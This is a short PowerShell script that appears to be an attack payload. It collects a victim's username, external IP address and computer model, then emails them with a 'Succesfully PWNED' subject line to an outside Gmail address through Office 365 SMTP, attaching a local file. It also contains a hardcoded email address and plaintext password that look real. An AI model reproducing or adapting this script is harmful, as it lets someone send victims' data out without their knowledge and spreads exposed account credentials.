
$smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
$smtp.Credentials = New-Object System.Net.NetworkCredential("davimoura2609@hotmail.com", "davi2609moura");
$smtp.EnableSsl = $true
$Message.From = "davimoura2609@hotmail.com"
$Message.To.Add("davimouar@gmail.com")
$ip = Invoke-RestMethod "myexternalip.com/raw"
$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$Message.Body = $ComputerName
$files=Get-ChildItem 
$Message.Attachments.Add("C:\Users\davim\Documents\iptv\smartes.png")
$smtp.Send($Message)
$Message.Dispose()
$smtp.Dispose()
#Cleanup



